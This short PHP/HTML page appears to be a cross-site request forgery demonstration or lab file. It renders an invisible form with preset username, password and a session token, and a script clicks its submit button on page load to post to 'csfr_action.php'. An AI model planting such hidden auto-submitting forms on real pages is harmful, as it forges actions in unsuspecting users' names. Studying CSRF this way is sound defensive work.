<!DOCTYPE html>
<html>
    <head></head>
    <body>
            <?php 
                session_start();
                $_SESSION['confirmation'] = 'confirm';
            ?>

         <form style="opacity:0" method="POST" action="./csfr_action.php">
            <input value="host" type="text" name="username">
            <input value="pass" name="password">
            <input value="<?php echo $_SESSION['confirmation']?>" name="confirmation">
            <input id="submit" type="submit" name="submit_btn">
        </form>
        <script>
            document.getElementById('submit').click();
        </script>
    </body>
</html>